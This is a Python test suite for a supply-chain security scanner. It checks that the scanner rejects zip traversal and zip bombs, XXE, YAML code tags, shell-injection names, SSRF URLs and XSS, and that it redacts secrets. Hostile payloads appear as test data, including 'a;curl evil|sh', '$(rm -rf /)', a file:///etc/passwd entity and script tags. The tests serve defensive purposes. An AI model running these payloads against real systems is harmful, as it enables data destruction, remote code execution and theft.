"""Adversarial inputs: archives, parsers, SSRF/egress, XSS, injection, secrets. All local; no third-party attack traffic."""
import io
import json
import os
import zipfile

import pytest

from helpers import make_zip, parse_files
from sentinel import report
from sentinel.analyzers import hygiene
from sentinel.intel.http import RequestBlocked, check_url
from sentinel.parsers.base import safe_name
from sentinel.reposource import DirSource, UnsafeInputError, ZipSource, normalize_member


# ------------------------------------------------------------------ archives
@pytest.mark.parametrize("name", ["../evil.txt", "a/../../evil", "/etc/passwd", "C:/Windows/x", "..\\..\\x", "a/\x00b"])
def test_traversal_names_rejected(name):
    assert normalize_member(name) is None


def test_zip_traversal_and_absolute_entries_never_exposed():
    data = make_zip({"package.json": {"dependencies": {}}, "../../outside.txt": "x", "/abs.txt": "y"})
    src = ZipSource(data)
    assert set(src.list_files()) == {"package.json"}
    assert {r["reason"].split()[0] for r in src.report.rejected} == {"unsafe"}


def test_zip_symlink_entries_rejected():
    info = zipfile.ZipInfo("link")
    info.external_attr = (0o120777 << 16)  # S_IFLNK
    src = ZipSource(make_zip({"ok.txt": "1"}, raw_entries=[(info, "/etc/passwd")]))
    assert src.list_files() == ["ok.txt"]
    assert any("symbolic" in r["reason"] for r in src.report.rejected)


def test_zip_bomb_ratio_rejected():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.txt", b"\0" * (20 * 1024 * 1024))   # ~1000:1 compression
        zf.writestr("package.json", "{}")
    src = ZipSource(buf.getvalue())
    assert "bomb.txt" not in src.list_files()
    assert any("compression ratio" in r["reason"] for r in src.report.rejected)


def test_zip_lying_header_is_capped():
    # header claims a small size; actual stream read is capped at the limit+1 and rejected
    data = make_zip({"a.txt": "hello"})
    src = ZipSource(data)
    assert src.read_bytes("a.txt", max_bytes=3) is None


def test_invalid_and_oversized_archives(monkeypatch):
    with pytest.raises(UnsafeInputError):
        ZipSource(b"PK\x03\x04garbage")
    from sentinel import reposource
    from sentinel.config import Limits
    monkeypatch.setattr(reposource, "LIMITS", Limits(max_archive_entries=3))
    with pytest.raises(UnsafeInputError):
        ZipSource(make_zip({f"f{i}": "x" for i in range(5)}))


@pytest.mark.skipif(os.name == "nt", reason="symlink creation needs privileges on Windows")
def test_dirsource_does_not_follow_symlinks(tmp_path):
    (tmp_path / "repo").mkdir()
    (tmp_path / "secret.txt").write_text("TOPSECRET")
    os.symlink(tmp_path / "secret.txt", tmp_path / "repo" / "link.txt")
    src = DirSource(str(tmp_path / "repo"))
    assert "link.txt" not in src.list_files()


def test_dirsource_rejects_reads_outside_index(tmp_path):
    (tmp_path / "a.txt").write_text("x")
    src = DirSource(str(tmp_path))
    assert src.read_bytes("../" + tmp_path.name + "/a.txt") is None


# ------------------------------------------------------------------ parsers
def test_xxe_and_billion_laughs_blocked():
    xxe = '<?xml version="1.0"?><!DOCTYPE p [<!ENTITY x SYSTEM "file:///etc/passwd">]><project><dependencies>&x;</dependencies></project>'
    lol = '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><project>&b;</project>'
    ctx, _ = parse_files({"a/pom.xml": xxe, "b/pom.xml": lol})
    assert {o.status for o in ctx.outcomes} == {"error"}


def test_yaml_object_tags_not_constructed():
    evil = "lockfileVersion: '6.0'\npackages: !!python/object/apply:os.system ['echo pwned']\n"
    ctx, _ = parse_files({"pnpm-lock.yaml": evil})
    assert ctx.outcomes[0].status == "error"


def test_deeply_nested_json_does_not_crash():
    deep = "[" * 100000 + "]" * 100000
    ctx, _ = parse_files({"package-lock.json": deep})
    assert ctx.outcomes[0].status == "error"


@pytest.mark.parametrize("payload", ["$(rm -rf /)", "`id`", "a;curl evil|sh", "x\n-r /etc/passwd", "<script>", "a b", "../../x"])
def test_command_injection_style_names_rejected(payload):
    assert safe_name(payload) is None


def test_injection_payloads_in_manifests_are_inert():
    lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/$(touch pwned)": {"version": "1.0.0"},
                                               "node_modules/ok": {"version": "1.0.0; rm -rf /"}}}
    ctx, _ = parse_files({"package-lock.json": lock})
    assert not any("$(" in p.name for p in ctx.graph.packages.values())
    assert all(p.version is None or " " not in p.version for p in ctx.graph.packages.values())
    assert not os.path.exists("pwned")


def test_engine_never_spawns_processes():
    import pathlib
    src_dir = pathlib.Path(__file__).resolve().parent.parent / "sentinel"
    for f in src_dir.rglob("*.py"):
        text = f.read_text(encoding="utf-8")
        code = "\n".join(l for l in text.splitlines() if not l.strip().startswith(("#", '"', "(")) and "re.compile" not in l)
        assert "import subprocess" not in code and "os.system(" not in code.replace('"os\\.system\\("', ""), f
        assert "shell=True" not in code, f


# ------------------------------------------------------------------ egress / SSRF
@pytest.mark.parametrize("url", [
    "http://api.osv.dev/v1/query",                 # downgrade to http
    "https://127.0.0.1/", "https://localhost/", "https://169.254.169.254/latest/meta-data/",
    "https://10.0.0.5/", "https://[::1]/", "https://evil.example.com/",
    "https://api.osv.dev.evil.com/", "https://user:pw@api.osv.dev/", "https://api.osv.dev:8443/",
    "file:///etc/passwd", "gopher://api.osv.dev/",
])
def test_egress_blocked(url):
    with pytest.raises(RequestBlocked):
        check_url(url)


def test_redirect_to_internal_host_blocked(monkeypatch):
    import httpx
    from sentinel.intel import http as H

    def handler(request):
        return httpx.Response(302, headers={"location": "http://169.254.169.254/latest"})
    monkeypatch.setattr(H, "_client", httpx.Client(transport=httpx.MockTransport(handler), follow_redirects=False))
    try:
        with pytest.raises(RequestBlocked):
            H.request_json("GET", "https://api.osv.dev/v1/vulns/X", retries=0)
    finally:
        monkeypatch.setattr(H, "_client", None)


def test_oversized_and_malformed_provider_responses(monkeypatch):
    import httpx
    from sentinel.intel import http as H
    big = b"[" + b"1," * 600000 + b"1]"

    def handler(request):
        if "big" in request.url.path:
            return httpx.Response(200, content=big)
        return httpx.Response(200, content=b"{oops")
    monkeypatch.setattr(H, "_client", httpx.Client(transport=httpx.MockTransport(handler)))
    try:
        with pytest.raises(H.ProviderError, match="size"):
            H.request_json("GET", "https://api.osv.dev/big", max_bytes=1000, retries=0)
        with pytest.raises(H.ProviderError, match="malformed"):
            H.request_json("GET", "https://api.osv.dev/bad", retries=0)
    finally:
        monkeypatch.setattr(H, "_client", None)


# ------------------------------------------------------------------ output encoding / secrets
def test_html_report_escapes_untrusted_text(demo_result):
    import copy
    res = copy.deepcopy(demo_result)
    f = next(x for x in res["findings"] if x["kind"] == "vulnerability")
    f["title"] = '<script>alert(1)</script>'
    f["advisory"]["source_url"] = "javascript:alert(1)"
    res["packages"][f["package_id"]]["name"] = '"><img src=x onerror=alert(1)>'
    html = report.render_html(res)
    assert "<script>alert(1)</script>" not in html
    assert "<img src=x" not in html
    assert 'href="javascript:' not in html
    assert "default-src 'none'" in html


def test_secrets_are_redacted_everywhere(tmp_path):
    token = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
    from sentinel import engine
    src = ZipSource(make_zip({"config.yml": f"github_token: {token}\n", "package.json": {"dependencies": {}}}))
    res = engine.run_scan(src, offline=True)
    blob = json.dumps(res) + report.render_html(res)
    assert token not in blob
    assert any(f["kind"] == "secret" for f in res["findings"])


def test_documented_example_key_marked_low_confidence():
    src = ZipSource(make_zip({"a.json": '{"k": "AKIAIOSFODNN7EXAMPLE"}'}))
    f = hygiene.scan_secrets(src)
    assert f and f[0]["confidence"] == "low"


def test_workflow_risks_detected():
    wf = """on: pull_request_target
permissions: write-all
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: {ref: "${{ github.event.pull_request.head.sha }}"}
      - uses: tj-actions/changed-files@v35
      - run: echo "${{ github.event.issue.title }}"
"""
    src = ZipSource(make_zip({".github/workflows/x.yml": wf}))
    kinds = {f["signal"] for f in hygiene.scan_workflows(src)}
    assert {"ci_pwn_request", "ci_excessive_permissions", "ci_unpinned_action", "ci_script_injection"} <= kinds
